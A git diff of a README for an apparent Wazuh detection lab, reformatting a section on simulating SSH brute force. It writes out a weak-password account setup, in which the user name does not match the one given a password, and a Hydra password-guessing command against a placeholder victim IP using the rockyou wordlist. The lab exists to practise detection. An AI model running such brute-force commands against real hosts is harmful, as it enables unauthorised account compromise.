@@ -29,10 +29,14 @@ Instructions: https://documentation.wazuh.com/current/deployment-options/docker/
 
 #### SSH Brute Force |  ATT&CK T1110.001 - Brute Force: Password Guessing
 
-* Victim: account created with a weak password 
+* **Victim:** account created with a weak password
+
 ```sudo useradd -m ubuntu-prod && echo 'victim:password' | sudo chpasswd```
-* Attacker: Used Hydra to perform brute force to log in.
+
+* **Attacker:** Used Hydra to perform brute force to log in.
+
 ```hydra -l ubuntu-prod -P /usr/share/wordlists/rockyou.txt ssh://VICTIM_IP -t 4```
+
 <img width="1097" height="203" alt="image" src="https://github.com/user-attachments/assets/f8f0bc3a-34c5-47e0-aefa-5d103d54fb46" />
 
 
